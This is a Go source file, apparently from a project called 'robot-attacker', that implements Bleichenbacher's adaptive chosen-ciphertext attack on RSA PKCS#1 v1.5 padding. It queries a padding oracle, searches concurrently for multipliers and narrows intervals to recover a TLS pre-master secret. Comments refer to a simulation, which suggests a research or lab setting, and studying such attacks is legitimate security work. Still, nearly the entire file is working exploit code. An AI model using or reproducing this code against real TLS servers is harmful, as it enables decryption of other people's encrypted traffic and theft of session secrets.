package crypto

import (
	"crypto/rsa"
	"fmt"
	"math/big"
	"robot-attacker/core"
	"sync"
	"sync/atomic"
)

// BleichenbacherAttacker implements the adaptive chosen-ciphertext attack
type BleichenbacherAttacker struct {
	PublicKey *rsa.PublicKey
	Oracle    *core.Oracle
	Modulus   *big.Int
	Exponent  *big.Int
	B         *big.Int
	B2        *big.Int
	B3        *big.Int
}

// Initialize attacker with modulus-specific boundaries
func NewBleichenbacherAttacker(publicKey *rsa.PublicKey, paddingOracle *core.Oracle) *BleichenbacherAttacker {
	keySizeBytes := int64(publicKey.N.BitLen() / 8)
	// B = 2^(8*(k-2))
	bValue := new(big.Int).Exp(big.NewInt(2), big.NewInt(8*(keySizeBytes-2)), nil)

	return &BleichenbacherAttacker{
		PublicKey: publicKey,
		Oracle:    paddingOracle,
		Modulus:   publicKey.N,
		Exponent:  big.NewInt(int64(publicKey.E)),
		B:         bValue,
		B2:        new(big.Int).Mul(big.NewInt(2), bValue),
		B3:        new(big.Int).Mul(big.NewInt(3), bValue),
	}
}

// Run executes the attack to recover the padded Pre-Master Secret
func (attacker *BleichenbacherAttacker) Run(targetCiphertext *big.Int) *big.Int {
	// Step 1: Check if target is already conforming
	// In our simulation, c0 is always conforming because it's a real TLS packet
	if !attacker.query(targetCiphertext) {
		fmt.Println("[ATTACK] Target ciphertext is NOT conforming. Initial blinding required (not implemented).")
		return nil
	}

	searchMultiplier := big.NewInt(1)
	activeIntervals := []AttackInterval{{Start: attacker.B2, End: new(big.Int).Sub(attacker.B3, big.NewInt(1))}}

	for i := 2; ; i++ {
		fmt.Printf("[ATTACK] Iteration %d | Intervals: %d | Last S: %s\n", i, len(activeIntervals), searchMultiplier.String())

		var nextMultiplier *big.Int
		if i == 2 {
			// Step 2a: Starting from s0=1, find the first s1 >= n/3B
			startS := CeilDiv(attacker.Modulus, attacker.B3)
			nextMultiplier = attacker.concurrentSearch(startS, targetCiphertext)
		} else if len(activeIntervals) > 1 {
			// Step 2b: Searching for next s_i with multiple intervals
			startS := new(big.Int).Add(searchMultiplier, big.NewInt(1))
			nextMultiplier = attacker.concurrentSearch(startS, targetCiphertext)
		} else {
			// Step 2c: Searching with only one interval remaining
			nextMultiplier = attacker.findFinalMultiplier(searchMultiplier, targetCiphertext, activeIntervals[0])
		}

		if nextMultiplier == nil { return nil }
		searchMultiplier = nextMultiplier

		// Step 3: Narrow down the possible intervals
		activeIntervals = attacker.calculateIntervals(activeIntervals, searchMultiplier)
		
		// Step 4: Check for convergence
		if len(activeIntervals) == 1 && activeIntervals[0].Start.Cmp(activeIntervals[0].End) == 0 {
			return activeIntervals[0].Start
		}

		if i > 20000 { return nil }
	}
}

func (attacker *BleichenbacherAttacker) query(ciphertext *big.Int) bool {
	payload := make([]byte, (attacker.Modulus.BitLen()+7)/8)
	ciphertext.FillBytes(payload)
	return attacker.Oracle.Query(payload)
}

func (attacker *BleichenbacherAttacker) concurrentSearch(startS, c0 *big.Int) *big.Int {
	// Use configured concurrency for faster simulation
	concurrency := core.Config.AttackConcurrency
	var result atomic.Value
	var wg sync.WaitGroup
	stop := make(chan struct{})
	
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func(offset int64) {
			defer wg.Done()
			currS := new(big.Int).Add(startS, big.NewInt(offset))
			step := big.NewInt(int64(concurrency))
			for {
				select {
				case <-stop: return
				default:
					c := new(big.Int).Exp(currS, attacker.Exponent, attacker.Modulus)
					c.Mul(c, c0)
					c.Mod(c, attacker.Modulus)
					
					if attacker.query(c) {
						if result.CompareAndSwap(nil, currS) { close(stop) }
						return
					}
					currS.Add(currS, step)
					// Safety break
					if currS.BitLen() > attacker.Modulus.BitLen() + 8 { return }
				}
			}
		}(int64(i))
	}
	wg.Wait()
	if val := result.Load(); val != nil { return val.(*big.Int) }
	return nil
}

func (attacker *BleichenbacherAttacker) findFinalMultiplier(prevS, c0 *big.Int, interval AttackInterval) *big.Int {
	// Step 2c implementation from the paper
	rValue := CeilDiv(new(big.Int).Mul(big.NewInt(2), new(big.Int).Sub(new(big.Int).Mul(interval.End, prevS), attacker.B2)), attacker.Modulus)
	
	for {
		sMin := CeilDiv(new(big.Int).Add(attacker.B2, new(big.Int).Mul(rValue, attacker.Modulus)), interval.End)
		sMax := FloorDiv(new(big.Int).Add(new(big.Int).Sub(attacker.B3, big.NewInt(1)), new(big.Int).Mul(rValue, attacker.Modulus)), interval.Start)
		
		currS := new(big.Int).Set(sMin)
		for currS.Cmp(sMax) <= 0 {
			c := new(big.Int).Exp(currS, attacker.Exponent, attacker.Modulus)
			c.Mul(c, c0)
			c.Mod(c, attacker.Modulus)
			if attacker.query(c) { return currS }
			currS.Add(currS, big.NewInt(1))
		}
		rValue.Add(rValue, big.NewInt(1))
		if rValue.BitLen() > 2048 { return nil }
	}
}

func (attacker *BleichenbacherAttacker) calculateIntervals(prevIntervals []AttackInterval, s *big.Int) []AttackInterval {
	nextIntervals := []AttackInterval{}
	for _, interval := range prevIntervals {
		rMin := CeilDiv(new(big.Int).Add(new(big.Int).Mul(interval.Start, s), new(big.Int).Sub(big.NewInt(1), attacker.B3)), attacker.Modulus)
		rMax := FloorDiv(new(big.Int).Sub(new(big.Int).Mul(interval.End, s), attacker.B2), attacker.Modulus)
		
		for rValue := new(big.Int).Set(rMin); rValue.Cmp(rMax) <= 0; rValue.Add(rValue, big.NewInt(1)) {
			aa := CeilDiv(new(big.Int).Add(attacker.B2, new(big.Int).Mul(rValue, attacker.Modulus)), s)
			if aa.Cmp(interval.Start) < 0 { aa = new(big.Int).Set(interval.Start) }
			
			bb := FloorDiv(new(big.Int).Add(new(big.Int).Sub(attacker.B3, big.NewInt(1)), new(big.Int).Mul(rValue, attacker.Modulus)), s)
			if bb.Cmp(interval.End) > 0 { bb = new(big.Int).Set(interval.End) }
			
			if aa.Cmp(bb) <= 0 {
				nextIntervals = append(nextIntervals, AttackInterval{Start: aa, End: bb})
			}
		}
	}
	// Interval union/merging can be added here but is not strictly necessary for PMS recovery
	return nextIntervals
}
